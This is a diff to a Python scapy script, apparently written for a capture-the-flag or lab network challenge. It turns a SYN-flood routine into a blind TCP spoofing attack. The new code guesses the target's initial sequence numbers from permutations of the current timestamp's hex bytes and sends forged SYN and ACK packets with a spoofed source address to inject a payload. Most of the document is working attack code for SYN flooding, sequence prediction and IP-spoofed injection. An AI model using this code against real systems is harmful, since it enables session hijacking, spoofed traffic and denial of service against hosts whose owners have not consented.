@@ -1,4 +1,4 @@
-from concurrent.futures import ThreadPoolExecutor
+from itertools import permutations
 from scapy.all import *
 import argparse
 import time
@@ -7,31 +7,97 @@ import netifaces as ni
 
 def syn_flood(model, network_interface):
     ip_syn = IP(dst=model['dest_ip'])
-    payload = "flagit"
-    
-    while True:
-        tcp_syn = TCP(sport=0, dport=model["dport"], flags="S")
-        pkt = ip_syn/tcp_syn/payload
+    payload = model["target_ip"]
+    file_object = open('output.out', 'a')
+    count = 0
+    try:
+        while count < 10000:
+            tcp_syn = TCP(sport=0, dport=model["dport"], flags="S", seq=666)
+            pkt = ip_syn/tcp_syn/payload
+            ans, unans = sr(pkt, multi=1, timeout=1)
+            
+            if len(ans) > 0:
+                last_request, last_answer = ans[-1]
+                seq = last_answer[TCP].seq
+                ack = last_answer[TCP].ack
+                # get absolute seq number
+                seq = seq + len(last_answer[TCP].payload)
+                file_object.write(str(seq) + "\n")
+                # # 1. FIND SYN-ACK PACKET in ans and extract the seq number
+                # last_request, last_answer = ans[-1]
+                # seq = last_answer[TCP].seq
+                # ack = last_answer[TCP].ack
+                # # # 2. Send ACK packet with seq number + 1
+                # ip_spoof = IP(src=model["src"], dst=model['dest_ip'])
+                # tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=ack, ack=seq + 1, flags="A")
+                # # # 3. Send payload
+                # new_pkt = ip_spoof/tcp_spoof/model['target_ip']
+                # send(new_pkt)
+            count += 1
+            time.sleep(1)
+    except:
+        print("Error in sending packets")
+        # print exception
+        print(sys.exc_info()[0])
+    finally:
+        file_object.close()
+        print("Closing")
+    return 1
+
+def calculate_current_sequence(the_time):
+    hex_string = hex(the_time).split('x')[-1]
+    hex_array = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
+    perms1 = map(lambda x: int(''.join(x), 16), permutations(hex_array))
+    return list(perms1)
+
+def get_seed_syn(model, network_interface):
+    ip_syn = IP(dst=model['dest_ip'])
+    payload = model["target_ip"]
+    tcp_syn = TCP(sport=0, dport=model["dport"], flags="S", seq=666)
+    pkt = ip_syn/tcp_syn/payload
+    print(pkt.summary())
+    count = 0
+    while count < 3:
+        possible_sequence = calculate_current_sequence(int(time.time()))
         ans, unans = sr(pkt, multi=1, timeout=1)
-        ans.show()
-        # 1. FIND SYN-ACK PACKET in ans and extract the seq number
         last_request, last_answer = ans[-1]
         seq = last_answer[TCP].seq
-        ack = last_answer[TCP].ack
-        # # 2. Send ACK packet with seq number + 1
-        ip_spoof = IP(src=model["src"], dst=dest_ip)
-        tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=ack, ack=seq + 1, flags="A")
-        # # 3. Send payload
-        new_pkt = ip_spoof/tcp_spoof/target_ip
-        send(new_pkt)
-        time.sleep(1)
+        lenght =  len(last_answer[TCP].payload)
+        raw_seq = seq + lenght
+        # get time stamp of last packet
+        t = last_answer.time
+        print(f'machine time {time.time()}, packet time {t}, Raw seq: {raw_seq}, lenght: {lenght}, seq: {seq}, sequences: {possible_sequence}')
+        hex_string = hex(seq).split('x')[-1]
+        hex_array = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
+        print('Hex seq', hex_array)
+        count += 1
+        time.sleep(0.2)
 
-def print_pkt(pkt):
-    print(pkt.summary())
+def spoof_tcp(model, network_interface):
+    while True:
+        possible_sequence = calculate_current_sequence(int(time.time()))
+        ip_syn = IP(src=model['src'], dst=model['dest_ip'])
+        payload = model["target_ip"]
+        tcp_syn = TCP(sport=model["dport"], dport=model["dport"], flags="S", seq=0)
+        pkt = ip_syn/tcp_syn/payload
+        pkt.summary()
+        send(pkt, iface=network_interface)
+        time.sleep(2)
+        seq = possible_sequence[0]
+        ip_spoof = IP(src=model["src"], dst=model['dest_ip'])
+        tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=1, ack=seq + 1, flags="A")
+        
+        new_pkt = ip_spoof/tcp_spoof/model['target_ip']
+        del new_pkt.chksum
+        
+        send(new_pkt, iface=network_interface)
+        print(f'Sending packet with seq {seq}')
+        time.sleep(2)
+    
 
-def sniff_packets(model, network_interface):
-    print("Sniffing packets", model, network_interface)
-    sniff(filter="tcp and port 13337 and tcp.flags.syn 1 and tcp.flags.ack 1", prn=print_pkt)
+def tcp_spoofer(model, network_interface):
+    #get_seed_syn(model, network_interface)
+    spoof_tcp(model, network_interface)
 
 def main_tcp(network_interface):
     model = {
@@ -45,10 +111,10 @@ def main_tcp(network_interface):
     dest_ip = socket.gethostbyname(model["dst"])
     model["target_ip"] = target_ip
     model["dest_ip"] = dest_ip
+    print(model)
+    #syn_flood(model, network_interface)
+    tcp_spoofer(model, network_interface)
 
-    with ThreadPoolExecutor(max_workers=2) as executor:
-        executor.submit(syn_flood, model, network_interface)
-        executor.submit(sniff_packets, model, network_interface)
 
 if __name__ == "__main__":
     network_interface = "tap0"
